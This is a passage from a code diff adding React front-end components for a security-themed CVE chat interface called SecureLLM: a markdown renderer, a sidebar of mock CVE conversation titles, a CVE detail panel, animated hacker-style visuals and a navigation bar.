+      <div className="twk-chips" role="radiogroup">
+        {options.map((o,i) => {
+          const colors = Array.isArray(o)?o:[o];
+          const [hero,...rest] = colors;
+          const on = key(o)===cur;
+          return (
+            <button key={i} type="button" className="twk-chip" data-on={on?'1':'0'}
+                    style={{background:hero}} onClick={()=>onChange(o)}>
+              {on && <__TwkCheck light={__twkIsLight(hero)}/>}
+            </button>
+          );
+        })}
+      </div>
+    </TweakRow>
+  );
+}
+
+/* ═══════════════════════════════════════════════
+   SEVERITY + MARKDOWN
+═══════════════════════════════════════════════ */
+function SeverityTag({severity,size='sm'}){
+  const cfg=SEVERITY_CONFIG[severity]||{color:'#7A4432',bg:'rgba(122,68,50,.12)',border:'rgba(122,68,50,.35)'};
+  const isCrit=severity==='CRITICAL';
+  const pad={sm:'2px 6px',md:'3px 10px',lg:'4px 12px'}[size]||'2px 6px';
+  const fs={sm:'10px',md:'12px',lg:'13px'}[size]||'10px';
+  return(
+    <span className={isCrit?'sev-crit':''} style={{display:'inline-flex',alignItems:'center',gap:'4px',padding:pad,borderRadius:'2px',fontSize:fs,fontWeight:700,fontFamily:"'JetBrains Mono',monospace",letterSpacing:'.07em',textTransform:'uppercase',color:cfg.color,background:cfg.bg,border:`1px solid ${cfg.border}`,verticalAlign:'middle',whiteSpace:'nowrap'}}>
+      {isCrit&&<span style={{opacity:.7}}>!!</span>}{severity}{isCrit&&<span style={{opacity:.7}}>!!</span>}
+    </span>
+  );
+}
+
+function renderInline(text,kp='ri'){
+  if(!text)return null;
+  const cveS={background:'rgba(204,48,16,.12)',color:'#FF4422',padding:'1px 7px',borderRadius:'2px',fontFamily:"'JetBrains Mono',monospace",fontSize:'12px',border:'1px solid rgba(204,48,16,.38)',whiteSpace:'nowrap'};
+  const codeS={background:'rgba(204,48,16,.08)',color:'#FFA080',padding:'1px 6px',borderRadius:'2px',fontFamily:"'JetBrains Mono',monospace",fontSize:'12px'};
+  const rx=/(\*\*[^*]+\*\*|`CVE-\d{4}-\d{4,7}`|CVE-\d{4}-\d{4,7}|`[^`]+`|\[CRITICAL\]|\[HIGH\]|\[MEDIUM\]|\[LOW\])/g;
+  return text.split(rx).map((p,i)=>{
+    if(!p)return null;
+    const k=`${kp}-${i}`;
+    if(p.startsWith('**')&&p.endsWith('**'))return<strong key={k} style={{color:'#EDD8C4',fontWeight:700}}>{p.slice(2,-2)}</strong>;
+    const cm=p.match(/^`?(CVE-\d{4}-\d{4,7})`?$/);
+    if(cm)return<code key={k} style={cveS}>{cm[1]}</code>;
+    if(p.startsWith('`')&&p.endsWith('`'))return<code key={k} style={codeS}>{p.slice(1,-1)}</code>;
+    if(p==='[CRITICAL]')return<SeverityTag key={k} severity="CRITICAL"/>;
+    if(p==='[HIGH]')    return<SeverityTag key={k} severity="HIGH"/>;
+    if(p==='[MEDIUM]')  return<SeverityTag key={k} severity="MEDIUM"/>;
+    if(p==='[LOW]')     return<SeverityTag key={k} severity="LOW"/>;
+    return<span key={k}>{p}</span>;
+  });
+}
+
+function renderMarkdown(text){
+  if(!text)return null;
+  const lines=text.split('\n');const out=[];let list=[];let inCode=false;let codeLines=[];let n=0;
+  const key=()=>`md-${n++}`;
+  const flush=()=>{
+    if(!list.length)return;
+    const k=key();
+    out.push(<ul key={k} style={{margin:'5px 0',padding:0,listStyle:'none'}}>{list.map((item,i)=>(<li key={i} style={{display:'flex',gap:'8px',padding:'3px 0',alignItems:'flex-start'}}><span style={{color:'#CC3010',fontSize:'11px',marginTop:'3px',flexShrink:0}}>&gt;</span><span style={{color:'#C8A898',lineHeight:1.55,flex:1}}>{renderInline(item,`li-${k}-${i}`)}</span></li>))}</ul>);
+    list=[];
+  };
+  lines.forEach((line,idx)=>{
+    if(inCode){if(line.startsWith('```')){out.push(<pre key={key()} style={{background:'rgba(204,48,16,.07)',border:'1px solid rgba(204,48,16,.2)',borderRadius:'2px',padding:'12px 14px',margin:'8px 0',overflowX:'auto',fontSize:'12px',lineHeight:1.6,color:'#FFA080',fontFamily:"'JetBrains Mono',monospace"}}><code>{codeLines.join('\n')}</code></pre>);codeLines=[];inCode=false;}else codeLines.push(line);return;}
+    if(line.startsWith('```')){flush();inCode=true;return;}
+    if(line.startsWith('### ')){flush();out.push(<p key={key()} style={{color:'#CC3010',fontWeight:700,margin:'13px 0 4px',fontSize:'10px',letterSpacing:'.14em',textTransform:'uppercase',fontFamily:"'JetBrains Mono',monospace"}}>{renderInline(line.slice(4),`h3-${idx}`)}</p>);}
+    else if(line.startsWith('## ')){flush();out.push(<p key={key()} style={{color:'#EDD8C4',fontWeight:700,margin:'13px 0 5px',fontSize:'15px'}}>{renderInline(line.slice(3),`h2-${idx}`)}</p>);}
+    else if(line.startsWith('# ')){flush();out.push(<p key={key()} style={{color:'#EDD8C4',fontWeight:700,margin:'13px 0 6px',fontSize:'16px'}}>{renderInline(line.slice(2),`h1-${idx}`)}</p>);}
+    else if(/^[-*•]\s+/.test(line)){list.push(line.replace(/^[-*•]\s+/,''));}
+    else if(line.trim()==='---'){flush();out.push(<hr key={key()} style={{border:'none',borderTop:'1px solid rgba(204,48,16,.15)',margin:'10px 0'}}/>);}
+    else if(line.trim()===''){flush();if(out.length)out.push(<div key={key()} style={{height:'6px'}}/>);}
+    else{flush();out.push(<p key={key()} style={{margin:'3px 0',lineHeight:1.6,color:'#C8A898',fontFamily:'Inter,sans-serif',fontSize:'14px'}}>{renderInline(line,`p-${idx}`)}</p>);}
+  });
+  flush();return out;
+}
+
+/* ═══════════════════════════════════════════════
+   SHARED UI PRIMITIVES
+═══════════════════════════════════════════════ */
+function Brackets({children,style,clr='rgba(255,68,34,.4)'}){
+  const s={position:'absolute',width:9,height:9,borderColor:clr,borderStyle:'solid'};
+  return(
+    <div style={{position:'relative',...style}}>
+      <div style={{...s,top:-1,left:-1,borderWidth:'1px 0 0 1px'}}/>
+      <div style={{...s,top:-1,right:-1,borderWidth:'1px 1px 0 0'}}/>
+      <div style={{...s,bottom:-1,left:-1,borderWidth:'0 0 1px 1px'}}/>
+      <div style={{...s,bottom:-1,right:-1,borderWidth:'0 1px 1px 0'}}/>
+      {children}
+    </div>
+  );
+}
+
+/* ═══════════════════════════════════════════════
+   SIDEBAR
+═══════════════════════════════════════════════ */
+const MOCK_CONVERSATIONS=[
+  {id:'c1',title:'Log4Shell Technical Analysis',   preview:'CVE-2021-44228 involves JNDI injection…',ts:new Date(Date.now()-7200000),   demoKey:'log4shell'},
+  {id:'c2',title:'CVE-2024-3400 PAN-OS Breakdown', preview:'GlobalProtect OS command injection, CVSS 10.0…',ts:new Date(Date.now()-86400000),  demoKey:'pan_os'},
+  {id:'c3',title:'CRITICAL vs HIGH Severity',      preview:'CVSS 9.0–10.0 is classified as CRITICAL…',ts:new Date(Date.now()-172800000),demoKey:'severity'},
+  {id:'c4',title:'Apache Vulnerabilities Q2 2024', preview:'Log4j2, Commons Text, Struts all hit…',  ts:new Date(Date.now()-259200000),demoKey:'apache'},
+  {id:'c5',title:'Linux Kernel LPE Techniques',    preview:'Dirty Pipe and OverlayFS both affect…',  ts:new Date(Date.now()-604800000), demoKey:'generic'},
+];
+const BINARY_BG=Array.from({length:40},()=>Math.floor(Math.random()*256).toString(2).padStart(8,'0'));
+
+function ConvItem({convo,isActive,onClick}){
+  const [h,setH]=useState(false);
+  return(
+    <div onClick={()=>onClick(convo.id)} onMouseEnter={()=>setH(true)} onMouseLeave={()=>setH(false)}
+      style={{padding:'8px 10px',cursor:'pointer',marginBottom:'1px',background:isActive?'rgba(204,48,16,.1)':h?'rgba(204,48,16,.05)':'transparent',borderLeft:`2px solid ${isActive?'#FF4422':h?'rgba(204,48,16,.4)':'transparent'}`,transition:'all .13s'}}>
+      <div style={{display:'flex',justifyContent:'space-between',gap:'6px',marginBottom:'2px'}}>
+        <span style={{fontSize:'11px',fontWeight:600,color:isActive?'#FF4422':h?C.text:'#7A4432',whiteSpace:'nowrap',overflow:'hidden',textOverflow:'ellipsis',flex:1,fontFamily:"'JetBrains Mono',monospace"}}>
+          <span style={{color:isActive?'#FF4422':'rgba(204,48,16,.35)',marginRight:'5px'}}>&gt;</span>{convo.title}
+        </span>
+        <span style={{fontSize:'9px',color:C.dim,flexShrink:0,fontFamily:"'JetBrains Mono',monospace"}}>{formatRelativeTime(convo.ts)}</span>
+      </div>
+      <p style={{fontSize:'10px',color:C.dim,margin:0,whiteSpace:'nowrap',overflow:'hidden',textOverflow:'ellipsis',fontFamily:"'JetBrains Mono',monospace"}}>{convo.preview}</p>
+    </div>
+  );
+}
+
+function Sidebar({activeConvId,onSelectConv,onNewChat}){
+  const [h,setH]=useState(false);
+  return(
+    <div style={{width:260,flexShrink:0,background:C.bg2,borderRight:`1px solid ${C.brd}`,display:'flex',flexDirection:'column',height:'100%',overflow:'hidden',position:'relative'}}>
+      <div style={{position:'absolute',right:0,top:56,bottom:50,width:16,fontSize:'7px',color:'rgba(204,48,16,.1)',fontFamily:"'JetBrains Mono',monospace",lineHeight:1.35,overflow:'hidden',userSelect:'none',pointerEvents:'none'}}>
+        {BINARY_BG.map((b,i)=><div key={i}>{b}</div>)}
+      </div>
+      <div style={{padding:'12px 10px 8px'}}>
+        <button onMouseEnter={()=>setH(true)} onMouseLeave={()=>setH(false)} onClick={onNewChat}
+          style={{width:'100%',padding:'8px 12px',background:h?'rgba(204,48,16,.16)':'rgba(204,48,16,.07)',border:`1px solid ${h?C.brd2:C.brd}`,borderRadius:'2px',color:'#FF4422',fontSize:'10px',fontWeight:700,cursor:'pointer',display:'flex',alignItems:'center',gap:'7px',fontFamily:"'JetBrains Mono',monospace",transition:'all .14s',textTransform:'uppercase',letterSpacing:'.08em'}}>
+          <span style={{fontSize:'16px',lineHeight:1}}>+</span>NEW ANALYSIS
+        </button>
+      </div>
+      <div style={{padding:'4px 14px 5px',display:'flex',alignItems:'center',gap:'8px'}}>
+        <span style={{fontSize:'9px',fontWeight:700,color:C.dim,letterSpacing:'.18em',textTransform:'uppercase',fontFamily:"'JetBrains Mono',monospace"}}>SESSIONS</span>
+        <div style={{flex:1,height:1,background:C.brd}}/>
+      </div>
+      <div style={{flex:1,overflowY:'auto',padding:'0 6px'}} className="sb-scroll">
+        {MOCK_CONVERSATIONS.map(c=><ConvItem key={c.id} convo={c} isActive={activeConvId===c.id} onClick={onSelectConv}/>)}
+      </div>
+      <div style={{padding:'10px',borderTop:`1px solid ${C.brd}`}}>
+        <Brackets style={{padding:'10px 12px',background:'rgba(204,48,16,.04)'}}>
+          <div style={{display:'flex',alignItems:'center',gap:'6px',marginBottom:'6px'}}>
+            <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><rect x="1" y="2.5" width="8" height="5.5" rx="1" fill="none" stroke="#CC3010" strokeWidth="1"/><path d="M3 2.5V1.5M7 2.5V1.5" stroke="#CC3010" strokeWidth="1" strokeLinecap="round"/><rect x="2.2" y="4" width="1.6" height="1.6" rx=".3" fill="#CC3010" opacity=".6"/><rect x="6.2" y="4" width="1.6" height="1.6" rx=".3" fill="#CC3010" opacity=".6"/></svg>
+            <span style={{fontSize:'11px',fontWeight:700,color:'#FF4422',fontFamily:"'JetBrains Mono',monospace"}}>LLAMA-3.1-8B</span>
+          </div>
+          <div style={{display:'flex',gap:'4px',flexWrap:'wrap'}}>
+            {['LORA','CUDA FP16','9,992 CVEs'].map(t=><span key={t} style={{fontSize:'9px',color:C.muted,background:'rgba(204,48,16,.06)',border:`1px solid ${C.brd}`,padding:'1px 5px',fontFamily:"'JetBrains Mono',monospace"}}>{t}</span>)}
+          </div>
+        </Brackets>
+        <div style={{marginTop:'8px',display:'flex',gap:'1px',height:'12px',opacity:.2}}>
+          {Array.from({length:42},(_,i)=><div key={i} style={{flex:i%7===0?2:1,background:'#CC3010',height:'100%'}}/>)}
+        </div>
+        <div style={{fontSize:'8px',color:C.dim,fontFamily:"'JetBrains Mono',monospace",marginTop:'2px',letterSpacing:'.05em'}}>ROOT@SECURELLM:~#</div>
+      </div>
+    </div>
+  );
+}
+
+/* ═══════════════════════════════════════════════
+   CVE PANEL
+═══════════════════════════════════════════════ */
+function CVSSBar({score}){
+  const [w,setW]=useState(0);
+  useEffect(()=>{const t=setTimeout(()=>setW((score/10)*100),200);return()=>clearTimeout(t);},[score]);
+  const color=score>=9?'#FF4422':score>=7?'#FF8C00':score>=4?'#FFD700':'#4A90D9';
+  return(
+    <div style={{marginBottom:'12px'}}>
+      <div style={{display:'flex',justifyContent:'space-between',marginBottom:'5px'}}>
+        <span style={{fontSize:'9px',color:C.dim,letterSpacing:'.12em',textTransform:'uppercase',fontWeight:700,fontFamily:"'JetBrains Mono',monospace"}}>CVSS v3.1</span>
+        <span style={{fontSize:'18px',fontWeight:800,color,fontFamily:"'JetBrains Mono',monospace",lineHeight:1}}>{score.toFixed(1)}</span>
+      </div>
+      <div style={{height:5,background:'rgba(255,255,255,.04)',border:`1px solid ${C.brd}`,overflow:'hidden'}}>
+        <div style={{height:'100%',width:`${w}%`,background:color,boxShadow:`0 0 10px ${color}70`,transition:'width 1.3s cubic-bezier(0.4,0,0.2,1)'}}/>
+      </div>
+    </div>
+  );
+}
+
+function MetaRow({label,value,mono}){
+  return(
+    <div style={{marginBottom:'10px',paddingBottom:'10px',borderBottom:'1px solid rgba(204,48,16,.1)'}}>
+      <div style={{fontSize:'9px',color:C.dim,letterSpacing:'.13em',textTransform:'uppercase',marginBottom:'3px',fontWeight:700,fontFamily:"'JetBrains Mono',monospace"}}>{label}</div>
+      <div style={{fontSize:'11px',color:C.muted,lineHeight:1.55,fontFamily:mono?"'JetBrains Mono',monospace":'Inter,sans-serif',wordBreak:'break-word'}}>{value}</div>
+    </div>
+  );
+}
+
+function RefLink({label,url}){
+  const [h,setH]=useState(false);
+  return(
+    <a href={url} target="_blank" rel="noopener noreferrer" onMouseEnter={()=>setH(true)} onMouseLeave={()=>setH(false)}
+      style={{display:'flex',alignItems:'center',gap:'7px',padding:'5px 8px',background:h?'rgba(204,48,16,.1)':'rgba(204,48,16,.04)',border:`1px solid ${h?C.brd2:C.brd}`,color:h?'#FF4422':C.muted,fontSize:'11px',textDecoration:'none',transition:'all .13s',marginBottom:'4px',fontFamily:"'JetBrains Mono',monospace",cursor:'pointer'}}>
+      <span style={{color:'#CC3010'}}>&gt;</span>
+      <span style={{flex:1}}>{label}</span>
+      <span style={{opacity:.35,fontSize:'10px'}}>↗</span>
+    </a>
+  );
+}
+
+function CVEPanel({cveData,isCollapsed,onToggle}){
+  return(
+    <div style={{width:isCollapsed?0:320,flexShrink:0,background:C.bg2,borderLeft:`1px solid ${C.brd}`,display:'flex',flexDirection:'column',height:'100%',overflow:'hidden',transition:'width .28s cubic-bezier(0.4,0,0.2,1)',position:'relative'}}>
+      {!isCollapsed&&cveData&&<>
+        <div className="cve-trace" style={{'--d':'3.2s','--dl':'0s'}}/>
+        <div className="cve-trace" style={{'--d':'3.2s','--dl':'1.6s'}}/>
+      </>}
+      <div style={{padding:'10px 14px',borderBottom:`1px solid ${C.brd}`,display:'flex',alignItems:'center',justifyContent:'space-between',flexShrink:0,minWidth:295}}>
+        <div style={{display:'flex',alignItems:'center',gap:'7px'}}>
+          <span style={{color:'#CC3010',fontSize:'10px'}}>▶</span>
+          <span style={{fontSize:'10px',fontWeight:700,color:C.muted,letterSpacing:'.13em',textTransform:'uppercase',fontFamily:"'JetBrains Mono',monospace"}}>CVE DETAIL</span>
+        </div>
+        <button onClick={onToggle}
+          style={{background:'none',border:`1px solid ${C.brd}`,cursor:'pointer',padding:'2px 8px',color:C.muted,fontSize:'10px',fontFamily:"'JetBrains Mono',monospace",transition:'all .13s',borderRadius:'2px'}}
+          onMouseEnter={e=>{e.currentTarget.style.color='#FF4422';e.currentTarget.style.borderColor=C.brd2;}}
+          onMouseLeave={e=>{e.currentTarget.style.color=C.muted;e.currentTarget.style.borderColor=C.brd;}}>
+          [×]
+        </button>
+      </div>
+      <div style={{flex:1,overflowY:'auto',padding:'14px',minWidth:295}} className="sb-scroll">
+        {!cveData?(
+          <div style={{display:'flex',flexDirection:'column',alignItems:'center',justifyContent:'center',height:'100%',textAlign:'center'}}>
+            <div style={{fontSize:'10px',color:C.dim,lineHeight:2,fontFamily:"'JetBrains Mono',monospace"}}>
+              // CVE METADATA<br/>// POPULATES ON<br/>// ID DETECTION
+            </div>
+          </div>
+        ):(
+          <div>
+            <Brackets style={{padding:'10px 12px',marginBottom:'14px',background:'rgba(204,48,16,.04)'}}>
+              <code style={{fontSize:'10px',color:'#FF4422',fontFamily:"'JetBrains Mono',monospace",display:'block',marginBottom:'7px'}}>{cveData.id}</code>
+              <h3 style={{fontSize:'12px',fontWeight:700,color:C.text,margin:0,lineHeight:1.45,fontFamily:'Inter,sans-serif'}}>{cveData.title}</h3>
+            </Brackets>
+            <div style={{background:'rgba(204,48,16,.05)',border:`1px solid ${C.brd}`,padding:'10px 12px',marginBottom:'14px'}}>
+              <div style={{fontSize:'9px',color:C.dim,marginBottom:'8px',letterSpacing:'.13em',textTransform:'uppercase',fontWeight:700,fontFamily:"'JetBrains Mono',monospace"}}>SEVERITY ASSESSMENT</div>
+              <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:'12px'}}>
+                <SeverityTag severity={cveData.severity} size="md"/>
+                <span style={{fontSize:'9px',color:C.dim,fontFamily:"'JetBrains Mono',monospace"}}>{cveData.published}</span>
+              </div>
+              <CVSSBar score={cveData.cvss}/>
+            </div>
+            <MetaRow label="Description" value={cveData.description}/>
+            <MetaRow label="Affected" value={cveData.affected}/>
+            <MetaRow label="Fix / Patch" value={cveData.patch}/>
+            <MetaRow label="CVSS Vector" value={cveData.vector} mono/>
+            <div style={{fontSize:'9px',color:C.dim,letterSpacing:'.13em',textTransform:'uppercase',marginBottom:'7px',fontWeight:700,fontFamily:"'JetBrains Mono',monospace"}}>REFERENCES</div>
+            {cveData.references.map((r,i)=><RefLink key={i} label={r.label} url={r.url}/>)}
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+/* ═══════════════════════════════════════════════
+   APP CONFIG
+═══════════════════════════════════════════════ */
+const TWEAK_DEFAULTS = /*EDITMODE-BEGIN*/{
+  "primaryColor": "#CC3010",
+  "rainOpacity": 0.045,
+  "compact": false,
+  "showScanlines": true
+}/*EDITMODE-END*/;
+
+const PALETTE_HL = { '#CC3010':'#FF4422', '#CC6010':'#FF8022', '#AA2080':'#DD30AA' };
+
+/* ═══════════════════════════════════════════════
+   ICONS
+═══════════════════════════════════════════════ */
+function ShieldIcon({size=24}){
+  return(
+    <svg width={size} height={size} viewBox="0 0 28 32" fill="none">
+      <path d="M14 1.5L25.5 6.5V16C25.5 22.3 20.4 27.9 14 30C7.6 27.9 2.5 22.3 2.5 16V6.5L14 1.5Z" stroke="#CC3010" strokeWidth="1.4" fill="rgba(204,48,16,0.07)"/>
+      <line x1="9" y1="13" x2="19" y2="13" stroke="#CC3010" strokeWidth="0.9" opacity="0.5"/>
+      <line x1="14" y1="8" x2="14" y2="22" stroke="#CC3010" strokeWidth="0.9" opacity="0.5"/>
+      <line x1="9" y1="13" x2="9" y2="17" stroke="#CC3010" strokeWidth="0.9" opacity="0.4"/>
+      <line x1="19" y1="13" x2="19" y2="17" stroke="#CC3010" strokeWidth="0.9" opacity="0.4"/>
+      <circle cx="14" cy="8" r="1.7" fill="#CC3010"/>
+      <circle cx="9" cy="13" r="1.4" fill="#CC3010" opacity="0.7"/>
+      <circle cx="19" cy="13" r="1.4" fill="#CC3010" opacity="0.7"/>
+      <circle cx="9" cy="17" r="1.1" fill="#CC3010" opacity="0.4"/>
+      <circle cx="19" cy="17" r="1.1" fill="#CC3010" opacity="0.4"/>
+      <circle cx="14" cy="22" r="1.4" fill="#CC3010" opacity="0.55"/>
+    </svg>
+  );
+}
+
+/* ═══════════════════════════════════════════════
+   BINARY RAIN
+═══════════════════════════════════════════════ */
+function MatrixRain({opacity=0.045}){
+  const cvRef=useRef(null);
+  useEffect(()=>{
+    const cv=cvRef.current;if(!cv)return;
+    const ctx=cv.getContext('2d');
+    let w=cv.offsetWidth||600,h=cv.offsetHeight||400;
+    cv.width=w;cv.height=h;
+    const fs=12;let cols=Math.floor(w/fs);
+    let drops=Array.from({length:cols},()=>-Math.floor(Math.random()*40));
+    let raf,tick=0;
+    const draw=()=>{
+      tick++;
+      if(tick%3===0){
+        ctx.fillStyle='rgba(13,9,6,.08)';ctx.fillRect(0,0,w,h);
+        ctx.font=`${fs}px 'JetBrains Mono',monospace`;
+        for(let i=0;i<drops.length;i++){
+          if(drops[i]*fs<0){drops[i]++;continue;}
+          const b=Math.random();
+          ctx.fillStyle=b>0.96?'rgba(237,216,196,.75)':`rgba(204,48,16,${(b*.28+.05).toFixed(2)})`;
+          ctx.fillText(b>0.5?'1':'0',i*fs,drops[i]*fs);
+          if(drops[i]*fs>h&&Math.random()>0.975)drops[i]=-Math.floor(Math.random()*30);
+          drops[i]++;
+        }
+      }
+      raf=requestAnimationFrame(draw);
+    };
+    raf=requestAnimationFrame(draw);
+    const obs=new ResizeObserver(()=>{w=cv.offsetWidth;h=cv.offsetHeight;if(w>0&&h>0){cv.width=w;cv.height=h;cols=Math.floor(w/fs);drops=Array.from({length:cols},()=>-Math.floor(Math.random()*40));}});
+    obs.observe(cv);
+    return()=>{cancelAnimationFrame(raf);obs.disconnect();};
+  },[]);
+  return <canvas ref={cvRef} style={{position:'absolute',inset:0,width:'100%',height:'100%',opacity:opacity,pointerEvents:'none',display:'block'}}/>;
+}
+
+/* ═══════════════════════════════════════════════
+   NAV
+═══════════════════════════════════════════════ */
+function NavBtn({label,onClick,active,primary}){
+  const [h,setH]=useState(false);
+  const bg=primary||(active&&h)?'rgba(204,48,16,.2)':active?'rgba(204,48,16,.12)':h?'rgba(204,48,16,.07)':'transparent';
+  const bd=active||primary?'rgba(255,68,34,.5)':'rgba(204,48,16,.28)';
+  return(
+    <button onClick={onClick} onMouseEnter={()=>setH(true)} onMouseLeave={()=>setH(false)}
+      style={{background:bg,border:`1px solid ${h?'rgba(255,68,34,.6)':bd}`,borderRadius:'2px',padding:'4px 10px',color:active||primary?'#FF4422':h?C.text:C.muted,fontSize:'10px',fontWeight:700,cursor:'pointer',fontFamily:"'JetBrains Mono',monospace",transition:'all .14s',whiteSpace:'nowrap',letterSpacing:'.07em',textTransform:'uppercase'}}>
+      {label}
+    </button>
+  );
+}
+function NavIco({children,title,onClick}){
+  const [h,setH]=useState(false);
+  return(
+    <button title={title} onClick={onClick} onMouseEnter={()=>setH(true)} onMouseLeave={()=>setH(false)}
+      style={{background:'none',border:`1px solid ${h?'rgba(204,48,16,.5)':'rgba(204,48,16,.22)'}`,borderRadius:'2px',padding:'4px 6px',color:h?C.text:C.muted,cursor:'pointer',display:'flex',alignItems:'center',transition:'all .14s'}}>
+      {children}
+    </button>
+  );
+}
+
+function ScanBar(){
+  const [pct,setPct]=useState(0);
+  useEffect(()=>{let p=0;const iv=setInterval(()=>{p=Math.min(p+Math.random()*15+8,100);setPct(p);if(p>=100)clearInterval(iv);},120);return()=>clearInterval(iv);},[]);
+  const f=Math.round(pct/100*16);
+  return(
+    <span style={{fontFamily:"'JetBrains Mono',monospace",fontSize:'10px',color:'#FF4422',display:'inline-flex',alignItems:'center'}}>
+      <span>[ </span><span style={{display:'inline-block',width:'9.6ch',overflow:'hidden',verticalAlign:'middle'}}><span style={{display:'block',transform:'scaleX(0.6) scaleY(0.65)',transformOrigin:'left center',whiteSpace:'nowrap'}}>{'█'.repeat(f)+'░'.repeat(16-f)}</span></span><span> ] {Math.round(pct)}%</span>
+    </span>
+  );
+}
+
+function TopNav({onNewChat,cvePanelOpen,onToggleCVE,onSettings}){
+  return(
+    <div style={{background:'#140E09',borderBottom:'1px solid rgba(204,48,16,.28)',flexShrink:0}}>
+      <div style={{padding:'8px 20px',borderBottom:'1px solid rgba(204,48,16,.15)',display:'flex',alignItems:'center',gap:'12px'}}>
+        <ShieldIcon size={22}/>
+        <span className="glitch" style={{fontSize:'16px',fontWeight:800,color:C.text,letterSpacing:'.08em',textTransform:'uppercase',fontFamily:"'JetBrains Mono',monospace"}}>SecureLLM</span>
+        <span style={{fontSize:'9px',color:C.dim,letterSpacing:'.14em',textTransform:'uppercase',fontFamily:"'JetBrains Mono',monospace"}}>// THREAT INTELLIGENCE ASSISTANT</span>
+        <div style={{flex:1}}/>
+        <NavBtn label="CVE PANEL" onClick={onToggleCVE} active={cvePanelOpen}/>
+        <NavBtn label="[+ NEW]" onClick={onNewChat} primary/>
+        <NavIco title="Settings" onClick={onSettings}>
+          <svg width="13" height="13" viewBox="0 0 13 13" fill="none">
+            <circle cx="6.5" cy="6.5" r="2" fill="none" stroke="currentColor" strokeWidth="1"/>
+            <path d="M6.5 1v1M6.5 11v1M12 6.5h-1M2 6.5H1M10.4 2.6l-.7.7M3.3 9.7l-.7.7M10.4 10.4l-.7-.7M3.3 3.3l-.7-.7" stroke="currentColor" strokeWidth="1" strokeLinecap="round"/>
+          </svg>
+        </NavIco>
+        <NavIco title="GitHub" onClick={()=>window.open('https://github.com','_blank')}>
+          <svg width="13" height="13" viewBox="0 0 13 13" fill="currentColor">
+            <path d="M6.5 0C2.91 0 0 2.91 0 6.5c0 2.87 1.86 5.31 4.44 6.17.32.06.44-.14.44-.31 0-.16-.01-.67-.01-1.22-1.63.3-2.04-.4-2.17-.77-.07-.19-.39-.77-.67-.92-.23-.12-.55-.41-.01-.42.51-.01.87.47 1 .67.58.98 1.51.7 1.88.53.06-.42.23-.7.41-.86-1.44-.16-2.94-.72-2.94-3.2 0-.71.25-1.29.67-1.74-.07-.16-.29-.82.06-1.71 0 0 .55-.17 1.79.67.52-.14 1.07-.21 1.63-.21.55 0 1.1.07 1.63.21 1.24-.84 1.79-.67 1.79-.67.35.89.13 1.55.06 1.71.42.45.67 1.02.67 1.74 0 2.49-1.51 3.04-2.95 3.2.23.2.44.58.44 1.19 0 .86-.01 1.55-.01 1.76 0 .17.12.38.44.31C11.14 11.81 13 9.37 13 6.5 13 2.91 10.09 0 6.5 0z"/>
+          </svg>
+        </NavIco>
+      </div>
+      <div style={{padding:'3px 20px',borderBottom:'1px solid rgba(204,48,16,.08)',display:'flex',alignItems:'center',gap:'14px',fontSize:'9px',fontFamily:"'JetBrains Mono',monospace",color:C.dim}}>
+        <span style={{color:C.muted}}>TERMINAL V 1.0.0</span>
+        <span style={{color:'rgba(204,48,16,.3)'}}>//</span>
+        <span>LLAMA-3.1-8B LORA CUDA FP16</span>
+        <span style={{color:'rgba(204,48,16,.3)'}}>//</span>
+        <span style={{color:'#1DB845'}}>
+          <span style={{position:'relative',display:'inline-flex',width:7,height:7,marginRight:5,verticalAlign:'middle'}}>
+            <span className="radar-ping"/>
+            <span className="radar-ping2"/>
+            <span style={{position:'relative',width:7,height:7,borderRadius:'50%',background:'#1DB845',display:'block',zIndex:1}}/>
+          </span>
+          ADMIN ACCESS GRANTED
+        </span>
+        <span style={{color:'rgba(204,48,16,.3)'}}>//</span>
+        <span>RTX 4050</span>
+      </div>
+      <div style={{padding:'4px 20px',display:'flex',alignItems:'center',gap:'14px',fontSize:'9px',fontFamily:"'JetBrains Mono',monospace"}}>
+        <span style={{color:C.dim}}>05 KILO MICROCYBER BATTLEDECK V02</span>
+        <div style={{flex:1}}/>
+        <span style={{color:C.muted}}>SCANNING</span>
+        <ScanBar/>
+        <span style={{color:C.dim}}>9,992/9,992 FILES</span>
+      </div>
+    </div>
+  );
+}
+
+/* ═══════════════════════════════════════════════
+   EMPTY STATE
+═══════════════════════════════════════════════ */
+const HEX_DEFS=[
+  {x:7,y:15,s:18,d:5.2,dl:0},{x:87,y:10,s:14,d:4.8,dl:1.2},{x:12,y:75,s:22,d:6.1,dl:.5},
+  {x:83,y:70,s:15,d:5.5,dl:1.8},{x:45,y:6,s:12,d:4.2,dl:.8},{x:55,y:90,s:20,d:6.5,dl:2.1},
+  {x:26,y:42,s:13,d:5.8,dl:1.5},{x:73,y:38,s:17,d:4.5,dl:.3},
+];
+
+function MiniScan(){
+  const [p,setP]=useState(0);
+  useEffect(()=>{let v=0;const iv=setInterval(()=>{v=Math.min(v+25,100);setP(v);if(v>=100)clearInterval(iv);},80);return()=>clearInterval(iv);},[]);
+  const f=Math.round(p/100*14);
+  return(
+    <span style={{color:'#FF4422',display:'inline-flex',alignItems:'center',fontFamily:"'JetBrains Mono',monospace",fontSize:'10px'}}>
+      <span>[ </span><span style={{display:'inline-block',width:'8.4ch',overflow:'hidden',verticalAlign:'middle'}}><span style={{display:'block',transform:'scaleX(0.6) scaleY(0.65)',transformOrigin:'left center',whiteSpace:'nowrap'}}>{'█'.repeat(f)+'░'.repeat(14-f)}</span></span><span> ]</span>
+    </span>
+  );
+}
+
+function EmptyState({onSuggest}){
+  const chips=['EXPLAIN LOG4SHELL','WHAT IS CVE-2024-3400?','COMPARE HIGH VS CRITICAL','LATEST APACHE VULNERABILITIES'];
+  return(
+    <div style={{display:'flex',flexDirection:'column',alignItems:'center',justifyContent:'center',height:'100%',gap:'20px',padding:'40px 24px',userSelect:'none',position:'relative',overflow:'hidden'}}>
+      {HEX_DEFS.map((p,i)=>(
+        <div key={i} className="hex-p" style={{left:`${p.x}%`,top:`${p.y}%`,'--d':`${p.d}s`,'--dl':`${p.dl}s`}}>
+          <svg width={p.s} height={p.s} viewBox="0 0 22 22" fill="none"><path d="M11 1L20.5 5.5V16.5L11 21L1.5 16.5V5.5L11 1Z" stroke="#CC3010" strokeWidth="1" fill="rgba(204,48,16,0.04)"/></svg>
+        </div>
+      ))}
+      <Brackets style={{padding:'28px 36px',textAlign:'center',position:'relative',zIndex:1,background:'rgba(204,48,16,.03)',minWidth:340}}>
